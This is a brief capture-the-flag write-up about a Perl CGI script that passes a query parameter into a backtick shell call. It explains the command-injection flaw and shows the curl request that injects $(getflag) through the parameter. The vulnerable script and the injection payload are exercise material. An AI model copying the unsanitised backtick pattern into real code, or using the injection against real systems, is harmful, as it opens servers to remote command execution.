At the user's home, there is a .pl file:

```perl
  use CGI qw{param};
  print "Content-type: text/html\n\n";
  sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
  }
  x(param("x"));
```

In Perl, CGI (Common Gateway Interface) is a protocol for executing scripts via web requests. 
This script prints the first query parameter x -> $_[0] to the standard output using the system `echo`.

However, during the substitution of the variable $y, there is no sanitization. By adding `$(getflag)` i can use the command substitution
to execute a command and give the result to echo.

I send it with the curl command:
```bash
curl 'http://localhost:4747/?x=$(getflag)'
```
